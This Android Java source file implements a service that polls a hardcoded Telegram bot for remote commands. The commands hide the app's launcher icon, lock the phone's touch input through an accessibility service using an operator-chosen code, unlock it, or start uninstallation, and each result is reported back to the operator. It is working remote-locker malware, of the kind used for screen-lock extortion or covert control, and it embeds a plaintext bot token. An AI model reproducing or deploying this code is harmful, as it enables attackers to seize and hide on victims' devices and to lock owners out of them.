package com.example.touchlock;

import android.app.*;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.*;
import okhttp3.*;
import org.json.*;
import java.util.concurrent.TimeUnit;

public class TouchLockService extends Service {
    public static TouchLockService instance;
    private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
    private OkHttpClient client;
    private long lastUpdateId = 0;
    private String adminChatId = "";
    private int lastOnlineMessageId = -1; // ID для "Бот онлайн"

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        client = new OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).build();
        createNotificationChannel();
        startForeground(1, getMyNotification("Система активна"));
        startPolling();
    }

    private void startPolling() {
        new Thread(() -> {
            boolean sentOnlineSignal = false;
            while (true) {
                try {
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
                    Response response = client.newCall(new Request.Builder().url(url).build()).execute();
                    
                    if (response.isSuccessful() && response.body() != null) {
                        JSONObject json = new JSONObject(response.body().string());
                        JSONArray results = json.getJSONArray("result");
                        
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject obj = results.getJSONObject(i);
                            lastUpdateId = obj.getLong("update_id");
                            
                            if (obj.has("message")) {
                                JSONObject msg = obj.getJSONObject("message");
                                adminChatId = msg.getJSONObject("chat").getString("id");
                                
                                if (!sentOnlineSignal) {
                                    sendTelegramMessage("✅ Бот онлайн!", true);
                                    sentOnlineSignal = true;
                                }

                                String text = msg.optString("text", "");
                                String[] parts = text.split(" ");
                                String cmd = parts[0].toLowerCase();
                                new Handler(Looper.getMainLooper()).post(() -> handleCommand(cmd, parts));
                            }
                        }
                    }
                } catch (Exception e) { try { Thread.sleep(5000); } catch (InterruptedException ignored) {} }
            }
        }).start();
    }

    private void handleCommand(String cmd, String[] parts) {
        if (cmd.equals("/hide")) {
            updateIconStatus(false);
            sendTelegramMessage("👻 Иконка скрыта", false);
        } else if (cmd.equals("/show")) {
            updateIconStatus(true);
            sendTelegramMessage("👁 Иконка возвращена", false);
        } else if (cmd.equals("/killme")) {
            sendTelegramMessage("💀 Запуск удаления...", false);
            updateIconStatus(true);
            if (TouchLockAccessibilityService.instance != null) TouchLockAccessibilityService.instance.unlock();
            new Handler().postDelayed(() -> {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                stopSelf();
            }, 2000);
        } else if (TouchLockAccessibilityService.instance != null) {
            if (cmd.equals("/block")) {
                String pass = (parts.length > 1) ? parts[1] : "0000";
                TouchLockAccessibilityService.instance.lock(pass);
                sendTelegramMessage("🔒 Заблокировано. Код: " + pass, false);
            } else if (cmd.equals("/stop")) {
                TouchLockAccessibilityService.instance.unlock();
                sendTelegramMessage("🔓 Разблокировано", false);
            }
        }
    }

    // Универсальный метод отправки
    public void sendTelegramMessage(String message, boolean isOnlineSignal) {
        if (adminChatId.isEmpty()) return;
        new Thread(() -> {
            try {
                if (isOnlineSignal && lastOnlineMessageId != -1) {
                    String delUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/deleteMessage?chat_id=" + adminChatId + "&message_id=" + lastOnlineMessageId;
                    client.newCall(new Request.Builder().url(delUrl).build()).execute();
                }
                String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + adminChatId + "&text=" + message;
                Response res = client.newCall(new Request.Builder().url(url).build()).execute();
                if (isOnlineSignal && res.isSuccessful()) {
                    JSONObject json = new JSONObject(res.body().string());
                    lastOnlineMessageId = json.getJSONObject("result").getInt("message_id");
                }
            } catch (Exception ignored) {}
        }).start();
    }

    private void updateIconStatus(boolean show) {
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        int newState = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        if (getPackageManager().getComponentEnabledSetting(componentName) != newState) {
            getPackageManager().setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel("TouchLockChannel", "Status", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification getMyNotification(String t) {
        return new Notification.Builder(this, "TouchLockChannel").setContentTitle("Touch Blocker").setContentText(t).setSmallIcon(android.R.drawable.ic_secure).setOngoing(true).build();
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { instance = null; super.onDestroy(); }
}
